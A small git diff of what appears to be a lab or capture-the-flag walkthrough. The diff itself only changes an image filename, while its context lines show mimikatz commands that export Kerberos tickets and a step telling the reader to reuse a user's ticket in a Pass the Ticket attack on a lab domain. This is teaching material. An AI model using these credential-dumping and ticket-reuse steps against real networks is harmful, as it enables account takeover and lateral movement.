@@ -210,7 +210,7 @@ mimikatz # privilege::debug
 mimikatz # sekurlsa::tickets /export
 ```
 
-<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption><p>total TGT found</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption><p>total TGT found</p></figcaption></figure>
 
 Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder \DC01.inlanefreight.htb\john
 
